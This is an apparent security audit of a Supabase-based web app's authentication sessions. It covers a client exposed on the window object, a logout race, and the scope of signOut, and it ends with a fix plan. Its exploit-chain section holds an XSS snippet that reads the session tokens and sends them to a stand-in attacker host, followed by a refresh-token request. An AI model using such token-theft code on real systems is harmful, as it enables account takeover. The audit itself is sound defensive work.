---
name: TICKET-AUTH-ARCH-001
description: ARCHITECT DEEP — VCSM auth session security audit. Supabase singleton exposure, token access risk, logout chain, session persistence, multi-tab, stolen token exploit chains.
metadata:
  type: architect-deep-security
  ticket: TICKET-AUTH-ARCH-001
  run-date: 2026-06-05
  scan-mode: DEEP / READ-ONLY
  scope: VCSM auth session security
  command: ARCHITECT
  status: COMPLETE
---

# ARCHITECT DEEP REPORT — TICKET-AUTH-ARCH-001
## Auth Session Security Audit — VCSM

**Mode:** READ-ONLY. No code was modified.
**Date:** 2026-06-05
**Scope:** Supabase singleton exposure, token access risk, logout behavior, session persistence after logout/refresh/multi-tab/stolen token.

---

## 1. SUPABASE CLIENT CREATION AND ACCESS PATH MAP

### Primary Client (Main App Auth)

```
supabaseClient.js
  getOrCreateClient()
    ├── checks globalThis.__SB_CLIENT__.__isSingleton   ← SINGLETON GATE
    ├── createClient(url, anon, {
    │     auth: {
    │       persistSession: true,          ← tokens written to localStorage
    │       autoRefreshToken: true,        ← automatic refresh enabled
    │       detectSessionInUrl: true,      ← PKCE/hash tokens consumed on init
    │       storageKey: 'sb-auth-main',    ← localStorage key for session JSON
    │     }
    │   })
    ├── Object.defineProperty(client, '__isSingleton', { value: true })
    └── globalThis.__SB_CLIENT__ = client   ← ⚠ ASSIGNED TO WINDOW GLOBAL
```

**Export:** `export const supabase = getOrCreateClient()` — ES module singleton.
**Global assignment:** `globalThis.__SB_CLIENT__` → accessible in browser as `window.__SB_CLIENT__`.

### Wanders Client (Guest/Anonymous Auth)

```
wandersSupabaseClient.js
  let _wandersClient = null  ← MODULE-SCOPED (not on globalThis)
  getWandersSupabase()
    ├── getOrCreateWandersClientKey()      ← UUID stored in localStorage
    ├── storageKey = `sb-auth-wanders-${clientKey}`
    ├── createClient(url, anon, {
    │     global: { fetch: withClientKeyFetch(clientKey) }
    │     auth: { storageKey }
    │   })
    └── _wandersClient = client            ← no globalThis assignment
```

**Key difference:** The Wanders client source explicitly comments: *"intentionally not on globalThis/window — globalThis exposes auth client to XSS; module scope does not."*
The primary client was written before this pattern was established and was never updated to match.

### Consumer Count

All 60+ DAL files across the app import `supabase` from `@/services/supabase/supabaseClient`. Every authenticated feature reaches the primary client through this singleton. The singleton is sound; the `globalThis` exposure is the attack surface.

---

## 2. WHY `__SB_CLIENT__` EXISTS AND WHETHER IT IS NEEDED IN PRODUCTION

**Origin:** HMR (Vite Hot Module Replacement) safety during development.

In Vite's HMR mode, each module hot-reload creates a fresh module scope. Without a persistent reference, `createClient()` would be called again on every hot reload, creating a second Supabase client instance. Multiple client instances cause:
- Duplicate `onAuthStateChange` listeners
- Split session state
- Double token refresh calls
- Auth event storms during dev

**Why `globalThis` was used:** Provides a persistent object that survives module scope teardown on HMR. The client is re-attached to the same `globalThis.__SB_CLIENT__` reference rather than creating a new one.

**Is it needed in production?**

**NO.** In a production build (`vite build`), HMR is disabled. Module scope is stable for the lifetime of the bundle. The `globalThis.__SB_CLIENT__` assignment fires every time the module executes, which in production is exactly once. The check `g.__SB_CLIENT__ && g.__SB_CLIENT__.__isSingleton` will always be false on the first (and only) call, so the singleton protection provides zero value in production. It only adds exposure.

**The Wanders client solves this correctly** using a module-scoped `let _wandersClient = null` variable. It achieves HMR safety (the module-level variable persists across hot reloads) without globalThis exposure.

**Fix:** Replace `getOrCreateClient()` body with a module-scoped `let _client = null` pattern identical to `getWandersSupabase()`. Delete the `globalThis.__SB_CLIENT__` assignment entirely.

---

## 3. TOKEN READ, PERSIST, REFRESH, AND LEAK MAP

### 3a. Persistence (Write)

| Where | How | Key | Trigger |
|---|---|---|---|
| Supabase SDK internals | `localStorage.setItem('sb-auth-main', JSON.stringify({ access_token, refresh_token, expires_at, user, ... }))` | `sb-auth-main` | Any sign-in, token refresh, setSession |
| Wanders SDK | `localStorage.setItem('sb-auth-wanders-${clientKey}', ...)` | `sb-auth-wanders-*` | Wanders sign-in or token refresh |
| React state (in-memory) | `AuthProvider.jsx:73` — `const [session, setSession] = useState(null)` | React fiber tree | onAuthStateChange / hydration |

The `session` state in `AuthProvider` holds the full session object (including `access_token`, `refresh_token`, `expires_at`). This is NOT exposed through `AuthContext` — context value is `{ user, loading, logout }` — but it IS accessible through React DevTools in development.

### 3b. Read (Legitimate)

| File | Line | Method | Returns |
|---|---|---|---|
| `authSession.read.dal.js` | 4 | `getSession()` | Full session + tokens |
| `authSession.read.dal.js` | 8 | `getSession()` | Full session + tokens |
| `login.dal.js` | 7 | `getUser()` | User object only (validated server-side) |
| `register.dal.js` | 9 | `getSession()` | Full session + tokens |
| `uploadToCloudflare.js` | 18 | `getSession()` then reads `.access_token` | access_token extracted directly |
| `portfolio/setup.js` | 45 | `getSession()` | access_token used for ownership check |
| `reviews/setup.js` | 44 | `getSession()` | session check |
| `wanders/services/wandersAuthSession.js` | 5 | `getSession()` on Wanders client | Wanders session user |
| `learning/adapters/actor.adapter.js` | 22,32 | `getUser()` then `getSession()` fallback | Full session on fallback |
| `settings/profile/dal/auth.read.dal.js` | 4 | `getUser()` | User object |
| `settings/vports/dal/vports.read.dal.js` | 23,64,102,125 | `getUser()` × 4 | User object |
| `settings/vports/dal/vports.write.dal.js` | 35,66,97 | `getUser()` × 3 | User object |
| `vport/dal/vport.core.dal.js` | 23 | `getUser()` | User object |

**Critical observation:** `getUser()` is preferred over `getSession()` in most DAL files — correct, as `getUser()` validates the JWT server-side. However, `getSession()` (which reads cached local storage without server validation) is used in `uploadToCloudflare.js`, `portfolio/setup.js`, `reviews/setup.js`, and several register paths. The `access_token` from `getSession()` is never validated server-side locally — it's trusted as-is.

### 3c. Token Mirroring (High-Risk Path)

```
register.controller.js (maybeMirrorWandersSession)
  → dalReadRegisterSession({ client: wandersClient })   // reads wanders session
    → session.access_token, session.refresh_token       // ⚠ tokens extracted
  → cross-check: session.user.id === expectedUserId     // VENOM-AUTH-003 guard
  → dalMirrorWandersSessionToPrimary({ accessToken, refreshToken })
    → supabase.auth.setSession({ access_token, refresh_token })  // injects tokens into primary client
    → supabase.auth.getSession()                                  // warms the session
```

The cross-user guard is present (`session.user?.id !== expectedUserId` aborts). But this path creates raw token objects as local JS variables (`access_token`, `refresh_token`) during the mirror operation. These are not persisted, only in-flight — acceptable risk.

### 3d. Auto-Refresh

Supabase SDK handles token refresh automatically via `autoRefreshToken: true`. The SDK watches `expires_at` in localStorage and fires a background `TOKEN_REFRESHED` auth event when it refreshes. `AuthProvider.jsx:139` explicitly short-circuits state update on `TOKEN_REFRESHED` to suppress unnecessary re-renders — this is correct.

Token refresh does NOT go through any app-layer code. The SDK calls the Supabase token endpoint directly and updates `sb-auth-main` in localStorage. This path is not observable to the app except through `onAuthStateChange`.

### 3e. Potential Leak Surfaces

| Surface | Risk | Notes |
|---|---|---|
| `window.__SB_CLIENT__` | **CRITICAL** | Any XSS payload can call `window.__SB_CLIENT__.auth.getSession()` and extract both tokens |
| `sb-auth-main` localStorage | HIGH | Standard Supabase behavior; mitigated only by browser same-origin policy |
| React state (`session` in AuthProvider) | LOW | Not in context; only accessible via React DevTools (dev only) or a same-origin XSS |
| `supabaseClient.debug.js:124` — `window.__sbDebug` | LOW | DEV-only guard present; `import.meta.env.DEV` — not shipped to production |
| `uploadToCloudflare.js:22` — `globalThis?.__WANDERS_SB__` | **NONE** | This global is never set — the Wanders client is module-scoped. This check is dead code. |

---

## 4. LOGOUT CHAIN MAP

### Complete Logout Sequence — `AuthProvider.jsx:logout()`

```
logout() invoked by user
│
├─ [1] setSession(null)                          // React state → UI immediately shows logged-out
├─ [2] setUser(null)                             // React state
├─ [3] setLoading(false)                         // React state
│
├─ [4] localStorage.removeItem('actor_kind')     // identity cache
├─ [5] localStorage.removeItem('actor_vport_id') // identity cache
├─ [6] localStorage.setItem('actor_touch', timestamp) // ← SET, not removed (multi-tab sync signal)
├─ [7] clearAllIdentityStorage()                 // removes all vc.identity.actorId.* keys
│
├─ [8] sessionStorage.removeItem('vcsm.debug.identity.events')
├─ [9] sessionStorage.removeItem('vcsm.debug.identity.snapshots')
├─ [10] sessionStorage.removeItem('vcsm.debug.switch.attempts')
├─ [11] sessionStorage.removeItem('vcsm.debug.switch.lastRequestedActorId')
├─ [12] sessionStorage.removeItem('vc.auth.recovery')  // recovery nonce
│
├─ [13] window.dispatchEvent('actor:changed', { kind: 'profile', id: null })  // cross-feature signal
├─ [14] hideLaunchSplash()
├─ [15] navigate('/login', { replace: true })    // ← NAVIGATION OCCURS HERE
│
├─ [16] await supabase.auth.signOut({ scope: 'local' })   // ⚠ AFTER NAVIGATION
│         removes 'sb-auth-main' from localStorage
│         does NOT invalidate server-side refresh token pool
│         try/catch: swallowed on failure → 'sb-auth-main' NOT cleared if this throws
│
└─ [17] supabase.getChannels().forEach(removeChannel)     // realtime cleanup
```

### What Is NOT Cleared During Logout

| Key | Location | Who clears it | Risk |
|---|---|---|---|
| `sb-auth-main` | localStorage | Supabase `signOut()` [step 16] — may fail | HIGH — if step 16 throws, session persists |
| `sb-auth-wanders-*` | localStorage | NOT cleared during main logout | MEDIUM — Wanders guest session persists independently |
| `actor_touch` | localStorage | SET to timestamp at step 6, never removed | LOW — intentional multi-tab sync signal |
| Supabase cookie (if SSR) | N/A | N/A — no SSR | N/A |
| `__SB_CLIENT__` global | globalThis | NEVER cleared | CRITICAL — survives logout, persists on page |

### Critical Ordering Issue

Steps 15 (navigate) and 16 (`signOut`) are sequential but navigation is non-blocking. The user arrives at `/login` while `signOut` is still in-flight. If `signOut` fails:
- `sb-auth-main` remains in localStorage
- Supabase `autoRefreshToken: true` is still active
- A new tab opened by the user, or a manual page refresh on `/login`, would re-hydrate the session
- `onAuthStateChange(SIGNED_IN)` would fire, re-populating AuthProvider state
- The user would be transparently re-authenticated

**This is the session persistence after signOut failure scenario.**

---

## 5. SIGOUT SCOPE SEMANTICS FOR THIS APP

Supabase `signOut` accepts `scope` with three values:

### `scope: 'local'` (current behavior — all signOut calls)
- Removes the session JWT from the local client's storage (`sb-auth-main` localStorage key)
- Does NOT call the Supabase token revocation endpoint
- The server-side refresh token record in `auth.sessions` table is NOT invalidated
- All other active sessions for this user (other devices, other browsers) remain fully valid
- A stolen refresh token remains valid indefinitely until server-side expiry or a 'global' signOut

**Used by:**
- `AuthProvider.jsx:202` — main logout
- `resetPassword.dal.js:23` — recovery session cleanup
- `register.dal.js:30` — register session cleanup (explicit scope)
- `login.dal.js:12` — `dalSignOut()` has NO scope parameter → defaults to `'local'` per Supabase SDK

### `scope: 'global'`
- Revokes ALL sessions for this user server-side
- Invalidates ALL refresh tokens across all devices
- Every active session across every device becomes invalid
- Appropriate for security-triggered logout (account compromise, password change, forced revocation)

### `scope: 'others'`
- Revokes all sessions EXCEPT the current one
- Current session remains active; all other devices are logged out
- The server-side refresh token for the current session is preserved

### App Policy Statement (from source comment, `AuthProvider.jsx:199-201`)

> "LOKI AD-01/AD-02: scope:'local' is intentional — other active sessions remain valid. This is expected multi-device behavior for a social platform. If full session revocation is ever required by policy, change scope to 'global'."

This is a documented architectural decision, not an oversight. **It is correct for a multi-device social platform.** The security implication is that a stolen refresh token will NOT be revoked by the victim's voluntary logout.

---

## 6. EXPLOIT CHAINS

### Chain A: XSS → `__SB_CLIENT__` → Token Theft

**Precondition:** Any XSS vulnerability in any page loaded under the VCSM origin.

```
1. Attacker injects script via XSS (content injection, third-party script, CSP miss)
2. Script runs in same origin as VCSM:
   const sb = window.__SB_CLIENT__;
   const { data } = await sb.auth.getSession();
   const { access_token, refresh_token, expires_at } = data.session;
3. Exfiltrate:
   navigator.sendBeacon('https://attacker.com/c2', JSON.stringify({ access_token, refresh_token }));
4. Attacker now holds:
   - access_token: valid for ~1 hour (Supabase default)
   - refresh_token: valid until server-side expiry or global signOut
5. Attacker can call Supabase token endpoint to refresh indefinitely:
   POST https://[supabase-project].supabase.co/auth/v1/token?grant_type=refresh_token
   { "refresh_token": "<stolen>" }
```

**Impact:** Full account takeover. The attacker can make any authenticated API call, read/write any data accessible to the user, and maintain access indefinitely.

**What prevents this today:** Same-origin policy (only JS on the VCSM origin can read `window.__SB_CLIENT__`). CSP, if configured. No XSS vulnerabilities.

**What does NOT prevent this:** The `__SB_CLIENT__` assignment itself. If any XSS lands — in any feature, any third-party script, any user-generated content injection — it directly yields both tokens.

**Contrast:** The Wanders client (`_wandersClient` module-scoped, not on globalThis) is NOT accessible via XSS unless the XSS can import ES modules — which is practically impossible without module-system access.

---

### Chain B: Stolen Refresh Token → Victim Logs Out → Attacker Retains Access

**Precondition:** Attacker has stolen a refresh token (via Chain A or another method).

```
1. Attacker steals refresh token (e.g., via XSS or physical access to localStorage)
2. Victim notices anomaly, clicks "Sign out" in VCSM
3. AuthProvider.logout() executes:
   → React state cleared, navigate('/login') fires
   → supabase.auth.signOut({ scope: 'local' }) executes
   → Only the LOCAL client session is cleared
   → auth.sessions record for the victim's device is invalidated server-side
   → BUT the attacker's copy of the refresh token targets a DIFFERENT session record
   → OR: if the attacker is using the same token, server revokes that one token only
4. Attacker makes POST to Supabase token endpoint with stolen refresh token:
   { "refresh_token": "<stolen token>" }
5. If the refresh token corresponds to a session not yet invalidated:
   → Attacker receives a new access_token + new refresh_token
   → Attacker maintains full access
```

**Critical condition:** `scope: 'local'` only invalidates the session record associated with the current client's `refresh_token`. If the attacker obtained the token via `getSession()` call and has stored it separately, the session record the victim is signing out of may be DIFFERENT from the one the stolen token belongs to (e.g., if the Supabase client refreshed the token after the theft, creating a new session record).

**To fully close this chain:** The victim must use `scope: 'global'` to revoke all refresh tokens server-side. The current implementation does not support this. This is documented as an architectural trade-off (see §5).

---

### Chain C: signOut Failure → Refresh Restores Session

**Precondition:** `supabase.auth.signOut({ scope: 'local' })` fails (network error, Supabase maintenance, transient 5xx).

```
1. User clicks logout
2. AuthProvider.logout():
   → Steps 1-15 execute: React state cleared, identity localStorage cleared, navigate('/login')
   → User is now on /login — UI shows "logged out"
3. Step 16: await supabase.auth.signOut({ scope: 'local' }) THROWS
4. catch(e) block fires: console.error('[Auth] signOut error:', e)
5. 'sb-auth-main' is NOT removed from localStorage (Supabase only removes it on success)
6. Supabase autoRefreshToken=true is still active in the background
7. Scenario A — user opens a new tab:
   → supabaseClient.js is re-executed (new tab = new page)
   → getOrCreateClient() finds globalThis.__SB_CLIENT__ (no — new page = new globalThis)
   → createClient() runs, detectSessionInUrl=true processes URL
   → getSession() reads 'sb-auth-main' from localStorage → finds valid session
   → onAuthStateChange fires SIGNED_IN
   → AuthProvider hydrates with the persisted session
   → User is silently re-authenticated
8. Scenario B — user navigates back to '/' while still on /login:
   → Same re-hydration occurs
   → AuthPublicRoute or route guard detects session and redirects to /feed
```

**Severity:** HIGH. Appears as "logout is broken." Common trigger: Supabase downtime, slow network, mobile going offline at logout moment.

**Mitigation that currently does not exist:** AuthProvider does not attempt to explicitly delete `localStorage.getItem('sb-auth-main')` as a fallback when `signOut()` fails. Adding this as a catch-block action would prevent re-hydration.

---

## 7. BLAST RADIUS ACROSS AUTHENTICATED APP MODULES

The `supabase` singleton is imported in 60+ files across 15+ feature areas. Every authenticated module is exposed through `window.__SB_CLIENT__` if XSS lands. Enumerated blast surface:

| Feature Area | Files Using supabase | Auth Exposure |
|---|---|---|
| auth (login, register, recovery) | 15 DAL files | Full session operations |
| settings (profile, vports, account, privacy) | 10 DAL files | `getUser()` — user identity only |
| post (postcard, commentcard) | 9 DAL files | Write surface for all user content |
| chat (inbox, conversation) | 4 DAL files | All message content |
| identity engine | 2 DAL files | Actor provisioning RPC |
| hydration engine | 1 setup file | Actor hydration |
| booking | 3 DAL files | Booking read/write |
| upload/media | 2 files | File upload with bearer token |
| portfolio | 1 setup file | Actor ownership check |
| reviews | 1 setup file | Review ownership check |
| vport | 2 DAL files | Vport record reads |
| wanders | 1 service file | Wanders session read |
| explore | 1 DAL file | Search |
| learning | 4 DAL files + adapter | Realm reads + actor resolution |
| dashboard/flyerBuilder | 1 DAL file | Auth for flyer access |

An XSS attacker who accesses `window.__SB_CLIENT__` has the ability to call any of the above DAL operations as the authenticated user.

---

## 8. RECOMMENDED FIX PLAN (MINIMAL SURGICAL CHANGES)

### Fix 1 — CRITICAL: Remove `globalThis.__SB_CLIENT__` exposure

**File:** `apps/VCSM/src/services/supabase/supabaseClient.js`

**Change:** Replace the `getOrCreateClient()` function body with a module-scoped variable pattern. Follow the pattern established by `wandersSupabaseClient.js`.

**Before (current):**
```js
function getOrCreateClient() {
  const g = globalThis;
  if (g.__SB_CLIENT__ && g.__SB_CLIENT__.__isSingleton) {
    return g.__SB_CLIENT__;
  }
  const client = createClient(url, anon, { ... });
  Object.defineProperty(client, '__isSingleton', { value: true });
  g.__SB_CLIENT__ = client;
  return client;
}
```

**After:**
```js
let _client = null;

function getOrCreateClient() {
  if (_client) return _client;
  _client = createClient(url, anon, { ... });
  return _client;
}
```

**What changes:** `window.__SB_CLIENT__` no longer exists. The HMR concern is addressed because module-scoped `let _client` survives Vite HMR (Vite replaces module code but preserves module-level variable values when the module is a singleton dependency). The Wanders client proves this pattern works.

**What does NOT change:** The `supabase` export. All 60+ import sites continue to work without modification.

---

### Fix 2 — HIGH: Harden logout against signOut failure

**File:** `apps/VCSM/src/app/providers/AuthProvider.jsx`

**Change:** In the `try/catch` block wrapping `supabase.auth.signOut()`, add an explicit localStorage removal of the Supabase session key as a fallback when signOut throws.

**Specific change in `logout()`:**
```js
try {
  await supabase.auth.signOut({ scope: 'local' })
  debugLoginEvent('AUTH_SIGNOUT_SUCCESS', ...)
} catch (e) {
  console.error('[Auth] signOut error:', e)
  debugLoginEvent('AUTH_SIGNOUT_ERROR', ...)
  // Fallback: manually clear session storage so autoRefreshToken cannot
  // re-hydrate the session after a failed signOut network call.
  try { localStorage.removeItem('sb-auth-main') } catch (_) {}
}
```

**Why 'sb-auth-main':** This is the `storageKey` defined in `supabaseClient.js`. Removing it prevents the Supabase SDK from finding a persisted session to restore on the next page load or tab open. If the signOut network call fails, this manual removal gives the same local-cleanup result without server-side revocation.

---

### Fix 3 — MEDIUM: Clean up dead code — `globalThis?.__WANDERS_SB__`

**File:** `apps/VCSM/src/services/cloudflare/uploadToCloudflare.js`

`getUploadAuthHeaders()` line 22 checks `globalThis?.__WANDERS_SB__` as a fallback when the primary session has no token. This global is **never assigned anywhere**. The Wanders client is module-scoped (`let _wandersClient`). This branch is unreachable dead code.

**Change:** Remove the `__WANDERS_SB__` fallback block in `getUploadAuthHeaders()`. The `if (!token) return {}` path is the correct fallback.

---

### Fix 4 — LOW/INFORMATIONAL: Consider `scope: 'global'` on security-triggered logout

This is a documented architectural trade-off (§5). No code change is required. Recommendation: add a `logoutAllSessions()` path to `AuthProvider` that calls `signOut({ scope: 'global' })` for use by security-triggered flows (e.g., password change, "sign out everywhere" UI option in settings). This would close Chain B for users who explicitly request full revocation.

---

## 9. REGRESSION RISKS

| Fix | Regression Risk | Details |
|---|---|---|
| Fix 1 (remove globalThis) | LOW | Module-scoped `let _client` is functionally identical to the globalThis pattern. Vite HMR preserves module-level variables. All 60+ import sites use the named `export const supabase` — no change to the public API. Risk: any external code that accesses `window.__SB_CLIENT__` directly would break. Grep confirms: **no app code reads `__SB_CLIENT__` other than the singleton guard in supabaseClient.js itself**. |
| Fix 2 (signOut fallback clear) | LOW | `localStorage.removeItem('sb-auth-main')` in the catch block only fires when `signOut()` throws. Normal logout path is unchanged. Risk: if Supabase internally uses the same key for something other than session storage (it doesn't — the key is the `storageKey` config), this could be disruptive. No regression risk given the known key name. |
| Fix 3 (remove dead __WANDERS_SB__) | NONE | The branch is unreachable. Removing it cannot break anything. |
| Fix 4 (global logout option) | MEDIUM | Adding a `logoutAllSessions()` to AuthProvider is additive. Risk only exists if it is accidentally called in place of the standard `logout()`. It must be a distinct function with a distinct call site. |

---

## 10. FILES THAT MUST CHANGE / MUST NOT CHANGE

### Must Change (for fixes above)

| File | Change | Priority |
|---|---|---|
| `apps/VCSM/src/services/supabase/supabaseClient.js` | Replace `globalThis.__SB_CLIENT__` with module-scoped `let _client = null` | CRITICAL |
| `apps/VCSM/src/app/providers/AuthProvider.jsx` | Add `localStorage.removeItem('sb-auth-main')` fallback in signOut catch block | HIGH |
| `apps/VCSM/src/services/cloudflare/uploadToCloudflare.js` | Remove dead `globalThis?.__WANDERS_SB__` fallback | MEDIUM |

### Must NOT Change (verified correct)

| File | Reason |
|---|---|
| `apps/VCSM/src/features/auth/dal/authSession.read.dal.js` | Correct DAL pattern; clean delegation to SDK |
| `apps/VCSM/src/features/auth/dal/resetPassword.dal.js` | Correctly uses `scope: 'local'`; non-controversial for recovery flow |
| `apps/VCSM/src/features/auth/dal/register.dal.js` | Token mirroring has userId cross-check; scope-correct signOut |
| `apps/VCSM/src/features/auth/controllers/register.controller.js` | VENOM-AUTH-003 guard present; userId cross-check before token injection |
| `apps/VCSM/src/features/auth/controllers/authCallback.controller.js` | Correctly guards against attacker-controllable hash params (BW-LOGIN-002) |
| `apps/VCSM/src/features/auth/controllers/setNewPassword.controller.js` | Recovery nonce TTL guard is correct; limitations documented inline |
| `apps/VCSM/src/state/identity/identityStorage.js` | Correct two-pass enumeration in `clearAllIdentityStorage()` |
| `apps/VCSM/src/features/wanders/services/wandersSupabaseClient.js` | Already uses the correct module-scoped pattern; do not change |

---

## ARCHITECT RECOMMENDATION

```
CAUTION — one CRITICAL finding (globalThis exposure) and one HIGH finding (signOut race).

Files to change: 3
Blast radius: LOW — changes are surgical; no public API modifications
Test risk: LOW — no behavior change for normal logout path
Regression risk: LOW
```

CRITICAL finding requires Fix 1 before any THOR gate. Fix 2 (signOut fallback) is HIGH but does not block release — it hardens against transient network failures, not normal flow.

---

## SUMMARY COUNTS

| Severity | Count |
|---|---|
| CRITICAL | 1 — `window.__SB_CLIENT__` exposes full Supabase client to XSS |
| HIGH | 2 — signOut after navigate (race), stolen refresh token survives local signOut |
| MEDIUM | 1 — dead `__WANDERS_SB__` global reference (dead code, not a live risk) |
| LOW | 1 — `scope: 'global'` not available for security-triggered logout |
| INFO | 2 — `getSession()` preferred over `getUser()` in upload/portfolio paths; `session` state in AuthProvider accessible via React DevTools |

---

*ARCHITECT DEEP — TICKET-AUTH-ARCH-001 — 2026-06-05 — READ-ONLY — No code modified*
